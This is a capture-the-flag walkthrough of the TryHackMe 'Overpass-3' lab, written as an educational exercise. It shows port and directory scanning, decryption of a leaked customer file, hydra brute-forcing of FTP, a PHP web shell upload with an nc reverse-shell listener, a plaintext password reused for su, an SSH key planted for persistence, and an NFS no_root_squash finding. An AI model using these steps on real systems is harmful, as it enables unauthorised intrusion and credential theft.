# Overpass-3 Tryhackme {THM}

Web flag

nmap -sC -sV --.--.---.--- -p- -T4
* -sC .
    Performs a script scan using the default set of scripts. It is equivalent to --script=default. Some
    of the scripts in this category are considered intrusive and should not be run against a target
    network without permission.

* -sV (Version detection) .
    Enables version detection, as discussed above. Alternatively, you can use -A, which enables version
    detection among other things.

* -p- port ranges (Only scan specified ports) .
    This option specifies which ports you want to scan and overrides the default. Individual port numbers
    are OK, as are ranges separated by a hyphen (e.g.  1-1023). The beginning and/or end values of a
    range may be omitted, causing Nmap to use 1 and 65535, respectively. So you can specify -p- to scan
    ports from 1 through 65535. Scanning port zero.  is allowed if you specify it explicitly. For IP
    protocol scanning (-sO), this option specifies the protocol numbers you wish to scan for (0–255).        

```
nmap -sC -sV --.--.---.--- -p- -T4                                                                                                                    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 16:42 CDT
Nmap scan report for --.--.---.---
Host is up (0.13s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Overpass Hosting
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 223.17 seconds
```

gobuster dir -u http://<ipaddress> -w /usr/share/wordslists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.zip

* -u string
        The target URL or Domain

* -x string
        File extension(s) to search for (dir mode only)

* -w string
        Path to the wordlist
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://--.--.---.--- -x .php,.html,.zip                                1 ⚙
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://--.--.---.---
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,zip
[+] Timeout:                 10s
===============================================================
2021/04/09 16:50:43 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1770]
/b-----s              (Status: 301) [Size: 237] [--> http://--.--.---.---/b-----s/]
```

```
wget http://--.--.---.---/b-----s/b----p.zip                                                                                                       
--2021-04-09 17:14:10--  http://--.--.---.---/b-----s/b----p.zip
Connecting to --.--.---.---:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13353 (13K) [application/zip]
Saving to: ‘backup.zip’

backup.zip                            100%[=============================================================================>]  13.04K  --.-KB/s    in 0.1s    

2021-04-09 17:14:10 (105 KB/s) - ‘backup.zip’ saved [13353/13353]

Unzipped backup.Unzipped

2 files created

priv.key

CustomerDetails.xlsx.gpg

```



```
gpg --list-keys
/home/reggie/.gnupg/pubring.kbx
-------------------------------
pub   rsa2048 2020-11-08 [SC] [expires: 2022-11-08]
      49829BBE**********F33CD2C9AE71AB3180BC08
uid           [ unknown] Paradox <paradox@overpass.thm>
sub   rsa2048 2020-11-08 [E] [expires: 2022-11-08]

gpg CustomerDetails.xlsx.gpg
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: encrypted with 2048-bit RSA key, ID 9E86A1*****96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"


┌──(reggie㉿kali)-[~/Downloads]
└─$ gpg --import priv.key
gpg: key C9AE71AB3180BC08: "Paradox <paradox@overpass.thm>" not changed
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1
```

| Customer Name  |  Username    |     Password     |  Credit card number |CCV|
|----------------|--------------|------------------|---------------------|---|
| Par. A. Doxx   |   p-----x    |S---------------3 | 4111 1111 4555 1142 |432|
| 0--y Montgomery|    0--y      |O---------------g | 5555 3412 4444 1115 |642|
| Muir Land      |m------------e|A---------------e | 5103 2219 1119 9245 |737|

This imformation is useful and can be used to make wordlists.

```
hydra -L user -P pass ssh://--.--.---.---
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-09 18:26:54
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking ssh://--.--.---.---:22/
[ERROR] target ssh://--.--.---.---:22/ does not support password authentication (method reply 36).
```
```
hydra -L user -P pass ftp://--.--.---.---
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-09 18:26:00
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking ftp://--.--.---.---:21/
[21][ftp] host: --.--.---.---   login: p-----x   password: S---------------3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-09 18:26:04
```
```
ftp --.--.---.---                   
Connected to --.--.---.---
220 (vsFTPd 3.0.3)
Name (--.--.---.---:------): paradox
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd backups
250 Directory successfully changed.
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
553 Could not create file.
ftp> cd ..
250 Directory successfully changed.
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5495 bytes sent in 0.00 secs (39.7003 MB/s)
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 48       48             24 Nov 08 21:25 backups
-rw-r--r--    1 0        0           65591 Nov 17 20:42 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17 20:42 index.html
-rw-r--r--    1 0        0             576 Nov 17 20:42 main.css
-rw-r--r--    1 0        0            2511 Nov 17 20:42 overpass.svg
-rw-r--r--    1 1001     1001         5495 Apr 10 00:27 shell.php
```

```
nc -lvnp 9001                                                                                                                                                                              1 ⨯
listening on [any] 9001 ...
connect to [--.--.---.---] from (UNKNOWN) [--.--.---.---] 55848
Linux ip-..-..-...-... 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:42:51 up 18 min,  0 users,  load average: 0.00, 0.01, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (885): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
sh-4.4$ whoami
whoami
apache
sh-4.4$ cat /etc/passwd | grep -i bash
cat /etc/passwd | grep -i bash
root:x:0:0:root:/root:/bin/bash
james:x:1000:1000:James:/home/james:/bin/bash
paradox:x:1001:1001::/home/paradox:/bin/bash
sh-4.4$ su paradox
su paradox
Password: ShibesAreGreat123
whoami
paradox
```

```
ssh-keygen -f paradox              
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in paradox
Your public key has been saved in paradox.pub
The key fingerprint is:
SHA256:KXGQq5N73XfOcgXw2P/Ss05Re0keSPSqklltU521swg reggie@kali
The key's randomart image is:
+---[RSA 3072]----+
|      ..    .o  .|
|      ..    o o =|
|      ...  E * Oo|
|      .o .  + X B|
|     o. S  . * O.|
|    +  .  + o . =|
|     o . = .   +.|
|    . . . o o.=.o|
|     .     . =++o|
+----[SHA256]-----+

cat paradox.pub
ssh-rsa A**********yc2EAAAADAQABAAABgQDQ34iovToFijivw0W/q+yGp+l4WRJdlA4QG7lgQN/dZBn9VEzGFxgvffABastsKnU+KsMWdW4yzHODkvuAYBkcN7W0iP2NU0Kwx6T2aENN7Uvs/IsbtSPKZHFdwZelh2D3pXGeXgnO3MTOG4RaJWP3bb7gKmrAQpIRS5K**********dNsvScLAJieOSlNQreKhId2mLpKftxUX8Hk2bNVeglyPP5NvVlVZ6G3qxNmP7w9aptBHVRqX1VkDcspuGrYVYeFhtWGbgzbgXzPumWG2dmbB9JjS/lgUrg3gJsq6JbSvpmyT09EXEaqbMcDJZhbQGXzVB+EdCHokNciWZvuZZoD1U3**********5nfdStC+dwkuLayrab17riplFXGXd/hkBSly+3YlzvvMsm5UbQDgo70dlO/NJ6gauHGOpZBoUlNQzF/9ZIt+QdTRYpSB------------------------------rOMoZuLNmDLLwsXIC12XAc= ------@kali

*Attack machine /home/paradox/.ssh/authorized_keys*

echo "ssh-rsa A**********yc2EAAAADAQABAAABgQDQ34iovToFijivw0W/q+yGp+l4WRJdlA4QG7lgQN/dZBn9VEzGFxgvffABastsKnU+KsMWdW4yzHODkvuAYBkcN7W0iP2NU0Kwx6T2aENN7Uvs/IsbtSPKZHFdwZelh2D3pXGeXgnO3MTOG4RaJWP3bb7gKmrAQpIRS5KF0oZWWAbhYd**********OSlNQreKhId2mLpKftxUX8Hk2bNVeglyPP5NvVlVZ6G3qxNmP7w9aptBHVRqX1VkDcspuGrYVYeFhtWGbgzbgXzPumWG2dmbB9JjS/lgUrg3gJsq6JbSvpmyT09EXEaqbMcDJZhbQGXzVB+EdCHokNciWZvuZZoD1U3**********5nfdStC+dwkuLayrab17riplFXGXd/hkBSly+3YlzvvMsm5UbQDgo70dlO/NJ6gauHGOpZBoUlNQzF/9ZIt+QdTRYpSB------------------------------rOMoZuLNmDLLwsXIC12XAc= ------@kali" > authorized_keys
```                          

```
ssh -i paradox paradox@--.--.---.---    
The authenticity of host '--.--.---.--- (--.--.---.---)' can't be established.
ECDSA key fingerprint is SHA256:Zc/Zqa7e8cZI2SP2BSwt5iLz5wD3XTxIz2SLZMjoJmE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '--.--.---.---' (ECDSA) to the list of known hosts.
Last login: Sat Apr 10 01:59:56 2021
```

Can I get lucky

find / -name *.flag 2>/dev/null

/***/*****/*****/***.flag

cat /***/*****/*****/***.flag

thm{0************************94be09d}

Yeah Baby

```
Using Linpeas.sh

[+] Searching Cloud credentials (AWS, Azure, GC)

[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                         
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```

```
ss -ltn
State               Recv-Q              Send-Q                            Local Address:Port                              Peer Address:Port              
LISTEN              0                   5                                       0.0.0.0:8000                                   0.0.0.0:*                 
LISTEN              0                   64                                      0.0.0.0:2049                                   0.0.0.0:*                 
LISTEN              0                   128                                     0.0.0.0:53063                                  0.0.0.0:*                 
LISTEN              0                   64                                      0.0.0.0:36009                                  0.0.0.0:*                 
LISTEN              0                   128                                     0.0.0.0:111                                    0.0.0.0:*                 
LISTEN              0                   128                                     0.0.0.0:20048                                  0.0.0.0:*                 
LISTEN              0                   128                                     0.0.0.0:22                                     0.0.0.0:*                 
LISTEN              0                   64                                         [::]:2049                                      [::]:*                 
LISTEN              0                   64                                         [::]:46415                                     [::]:*                 
LISTEN              0                   128                                        [::]:54895                                     [::]:*                 
LISTEN              0                   128                                        [::]:111                                       [::]:*                 
LISTEN              0                   128                                        [::]:20048                                     [::]:*                 
LISTEN              0                   128                                           *:80                                           *:*                 
LISTEN              0                   32                                            *:21                                           *:*                 
LISTEN              0                   128                                        [::]:22                                        [::]:*                 
```
